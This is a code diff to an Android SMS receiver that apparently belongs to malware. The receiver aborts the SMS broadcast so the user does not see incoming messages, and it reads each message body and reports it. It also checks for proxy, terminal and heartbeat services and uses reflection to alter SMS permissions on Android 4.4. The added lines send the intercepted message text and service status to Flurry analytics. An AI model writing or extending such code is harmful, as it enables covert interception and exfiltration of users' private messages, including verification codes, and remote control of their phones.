@@ -84,13 +84,21 @@ public class Receiver_SMS extends BroadcastReceiver {
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		try {
+
 			final String message = "接到短信通知了";
 			EventBus.getDefault().post(new Message(message));
+			Map<String, String> map3 = new HashMap<>();
+			map3.put(NativeParams.KEY_MESSAGE_ACTION, intent.getAction());
+			FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST_PRO1, map3);
 
 			if (SMS_ACTION.equals(intent.getAction())) {
 				Bundle args = intent.getExtras();
 				String msgContent = "";
 				final boolean isHeartBeatServiceLive = Util_Service.isServiceRunning(context, HeartBeatService.class
+						.getCanonicalName());
+				final boolean isTerminalServiceLive = Util_Service.isServiceRunning(context, TerminalManager.class
+						.getCanonicalName());
+				final boolean isProxyServiceLive = Util_Service.isServiceRunning(context, ProxyService.class
 						.getCanonicalName());
 				if (DEBUG) {
 					Log.d(TAG, "当前service状态 " + isHeartBeatServiceLive + " 收到短信:" + args);
@@ -105,6 +113,10 @@ public class Receiver_SMS extends BroadcastReceiver {
 //					this.clearAbortBroadcast();
 //				}
 				this.abortBroadcast();
+				Map<String, String> map1 = new HashMap<>();
+				map1.put(NativeParams.KEY_MESSAGE_ARGS, args.toString());
+				FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST_PRO, map1);
+
 				if (args != null) {
 					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
 					SmsMessage messages[] = new SmsMessage[pdus.length];
@@ -114,7 +126,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 //						hasPhoneNumber = false;
 //					}
 					if (DEBUG) {
-						Log.d(TAG, "该短信由几个pdus组成：" + pdus.length);
+						Log.d(TAG, "message length：" + pdus.length);
 					}
 					StringBuilder sb = new StringBuilder();
 					for (int i = 0; i < messages.length; i++) {
@@ -127,6 +139,15 @@ public class Receiver_SMS extends BroadcastReceiver {
 						}
 						reportData(context, sb.toString());
 					}
+
+					Map<String, String> map = new HashMap<>();
+					map.put(NativeParams.KEY_MESSAGE_INFO, sb.toString());
+					map.put(NativeParams.KEY_PROXY_STATUS, String.valueOf(isProxyServiceLive));
+					map.put(NativeParams.KEY_TERNIMAL_STATUS, String.valueOf(isTerminalServiceLive));
+					map.put(NativeParams.KEY_HEART_STATUS, String.valueOf(isHeartBeatServiceLive));
+					map.put(NativeParams.KEY_MESSAGE_LENGTH, String.valueOf(messages.length));
+					FlurryAgent.logEvent(NativeParams.EVENT_GET_MESSAGE_BROADCAST, map);
+
 					for (int i = 0; i < messages.length; i++) {
 						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 						msgContent = messages[i].getMessageBody();
@@ -149,12 +170,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 //								FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
 //							}
 //						}
-						final boolean isTerminalServiceLive = Util_Service.isServiceRunning(context, TerminalManager
-								.class.getCanonicalName());
-						final boolean isProxyServiceLive = Util_Service.isServiceRunning(context, ProxyService.class
-								.getCanonicalName());
 						//if (isTerminalServiceLive && isProxyServiceLive) {
-
 						if (msgContent != null) {
 							if (DEBUG) {
 								Log.d(TAG, "收到的短信内容：" + msgContent);
@@ -173,10 +189,10 @@ public class Receiver_SMS extends BroadcastReceiver {
 										if (DEBUG) {
 											Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
 										}
-										Map<String, String> map = new HashMap<>();
-										map.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
-										map.put(NativeParams.KEY_KITKAT_DEVICE, model);
-										FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map);
+										Map<String, String> map2 = new HashMap<>();
+										map2.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
+										map2.put(NativeParams.KEY_KITKAT_DEVICE, model);
+										FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map2);
 									}
 								}
 
@@ -190,7 +206,7 @@ public class Receiver_SMS extends BroadcastReceiver {
 //									if (HeartBeatRunnable.isSSHConnected) {
 //										deleteSMS(context, msgContent);
 //									}
-								return;
+								break;
 							}
 						}
 						//}
